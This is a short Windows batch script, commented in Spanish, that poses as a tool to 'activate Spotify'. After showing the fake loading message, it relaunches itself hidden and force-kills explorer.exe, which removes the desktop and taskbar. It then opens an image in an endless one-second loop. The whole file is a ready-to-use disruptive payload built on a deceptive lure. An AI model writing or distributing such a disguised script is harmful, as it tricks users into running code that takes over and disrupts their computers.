@echo off
title Importante
color 0A
echo Cargando archivos del sistema para activar spotify... 
timeout /t 3 /nobreak >nul

:: Ocultar la ventana del script al ejecutarse
if "%1"=="hidden" goto hidden
start /min cmd /c "%~f0 hidden"
exit

:hidden
:: Ruta de la imagen (¡Cámbiala por la tuya!)
set img=".\image.jpg"

:: Cerrar el Explorador de archivos (oculta barra de tareas y escritorio)
taskkill /f /im explorer.exe

:: Bucle infinito para abrir imágenes y páginas web
:loop
start %img%

timeout /t 1 /nobreak >nul
goto loop
